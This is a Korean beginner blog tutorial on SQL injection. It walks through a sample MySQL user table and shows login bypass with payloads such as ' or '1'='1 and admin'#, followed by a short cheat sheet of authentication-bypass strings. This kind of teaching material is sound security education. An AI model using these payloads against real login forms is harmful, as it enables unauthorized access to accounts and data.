---
layout: post
title: SQL Injection 1
date: 2015-08-15 15:30:00 +0900
category: Hacking 
---
SQL Injection은 DataBase에서 사용되는 SQL(Structure Query Language)이라는 언어에서 발견되는 취약점입니다.

일반적으로 SQL을 알기 위해선 그 전에 DataBase에 대해서 기본지식이 있어야 합니다.

먼저 DataBase 라는 것은 정보의 집합체입니다. 보통 개인적으로 공부하는 사람들은 MySQL을 쓰기떄문에 MySQL 문법 위주로 설명할겁니다.



MySQL 내에는 다양한 DataBase가 존재합니다.



mysql> show databases;

+--------------------+

| Database           |

+--------------------+

| information_schema |

| mysql              |

| performance_schema |

| user               |

+--------------------+

4 rows in set (0.00 sec)




일단 현재 제 DB에는 4가지 DB가 있습니다.  그 중에서 user라는 DataBase를 사용합니다.

이 user라는 DB안에는 Table 이라는 개념이 존재합니다. 쉽게 말하자면 우리가 사용하는 윈도우상의 '폴더'라고 보면 됩니다. 




- ![폴더 구조](/assets/img/274F3A3E55CECF1601.png)


현재 라이브러리 라는 DataBase 안에는 문서, 비디오, 사진, 음악이라는 Table들이 있는거죠



현재 user DatBase 안의 Table구조는 밑과 같습니다. 



mysql> show tables;

+----------------+

| Tables_in_user |

+----------------+

| member         |

+----------------+

1 row in set (0.01 sec)


그리고 이 member라는 테이블은 다음과 같은 구조를 이루고 있습니다.



mysql> desc member;

+-------+-------------+------+-----+---------+-------+

| Field | Type        | Null | Key | Default | Extra |

+-------+-------------+------+-----+---------+-------+

| ID    | varchar(15) | YES  |     | NULL    |       |

| PW    | varchar(15) | YES  |     | NULL    |       |

+-------+-------------+------+-----+---------+-------+

2 rows in set (0.00 sec)




현재 member라는 테이블은 ID와 PW라는 컬럼을 가지고 있습니다.

두개의  컬럼은 VARCHAR이라는 속성을 갖고 있는데 C언어로 치자면 문자열 자료형 입니다. 15라는 숫자는 들어갈 수 있는 최대 문자열의 길이입니다. 물론 다양한 자료형을 갖고있습니다. int, text 등등....그 외에도 Key 라는 개념이 있지만 나중에 설명하기로 하죠.  DB는 파다보면 끝이 없어요 하핳



mysql> select * from member;

+-------+----------+

| ID    | PW       |

+-------+----------+

| admin | P@ssw0rd |

+-------+----------+

1 row in set (0.00 sec)


현재 member Table 안에 들어있는 정보입니다. 간단한 ID와 PW정보가 들어있습니다.


보통 SQL Injection 이 가장 많이 사용되는 곳은 로그인 부분입니다.

여러분이 웹페이지에 ID와 PW를 검색하면 웹 서버는 DB에다가 물어봅니다. 이 때 쿼리문을 날리게 되는데 

이해를 돕기위해 가장 쉬운 쿼리문을 사용해 봅시다.



SELECT * FROM member where ID='admin' AND PW='P@ssw0rd';

이런식으로 ID는 admin이면서 PW는 P@ssw0rd인 값을 찾습니다.

만약 여러분이 ID나 PW가 틀린다면 결과값은 없으므로 로그인을 못하게 됩니다. 



하지만 SQL Injection은 간단한 논리적 오류를 이용하여 이것을 우회할 수 있습니다.

만약 여러분이 ' or '1'='1 이라는 값을 PW에 넣게 된다면



SELECT * FROM member where ID='admin' AND PW=''or '1'='1';

이런 쿼리문이 완성되게 됩니다. 이 쿼리를 실행하면 다음과 같은 결과를 얻습니다.



mysql> SELECT * FROM member where ID='admin' AND PW=''or '1'='1';

+-------+----------+

| ID    | PW       |

+-------+----------+

| admin | P@ssw0rd |

+-------+----------+

1 row in set (0.00 sec)



왜 이렇게 되느냐, 먼저 and 연산은 둘다 참이면 참을 반환하고 or은 둘 중 하나만 참이어도 참을 반환합니다.

아 참고로 C언어에서는 컴퓨터는 0이 아닌 모든값을 참으로 인식합니다.



그러면 저 쿼리문은 



ID='admin' AND PW=' ' or '1'='1';



뜯어보면 PW부분에 아무것도 없습니다. ' ' 따옴표 2개만 있죠 비어있습니다. 저기에 아무 값이나 넣어도 상관없습니다.

근데 뒷부분을 보녀  or '1'='1'이라고 되어있죠 PW라는 값에다가  ' ' 과 '1'='1' 이라는 값을 or 연산한 값을 넣습니다. 

1=1 이기 떄문에 오른쪽은 참이되고 왼쪽은 뭐 거짓이라고 칩시다 참과 거짓을 or 연산했으므로 참이 됩니다. 

즉 PW값을 참 즉 어떤 비밀번호가 들어오던 옳은 PW라고 인식을 하게됩니다. 그리고 ID하고 AND 연산을 하게되니 결과값은 

admin의 비밀번호를 가져올 수 있게 되는것이죠 .

이것이 SQL Injection의 가장 기본이 되는 논리적 오류를 이용한 공격입니다. 물론 말도 안될만큼 초보적인 부분입니다. 하핳



이것을 위한 Cheet Sheat 도 많아요. 사실 이렇게 간단한 공격은 수도 없이 많아서 다 적을수가 없습니다만 많이 쓰이는 것들로...



or 1=1

'or 1=1

*or 1=1 

or 1=1-

'or 1=1-

"or 1=1-

or 1=1#

'or 1=1#

"OR

1=1#

OR 1=1/*

'or 1=1/"



"or 1=1/" 

or 1=1;%00

' or 1=1;%00 

"or 1=1;%00

'or '

'or

'or'-

'or -

or a=a

하아하아 너무 많아서 다 못적어요 아 저기서 -- 와 # 과 ;%00 그리고 /*는 MySQL에서 주석을 뜻합니다.

쿼리문에서 주석을사용하면 이렇게 됩니다.

mysql> select * from member where ID='admin'#'' AND PW='fsdfsd';

    -> ;

+-------+----------+

| ID    | PW       |

+-------+----------+

| admin | P@ssw0rd |

+-------+----------+

1 row in set (0.00 sec)


ID는 admin인데 뒤에 PW를 비교하는 부분을 주석처리해서 전부 무효화 시켜버리니 로그인에 성공하겠죠. 하핳

다음 글은 다음에 쓸게요 그럼 20000



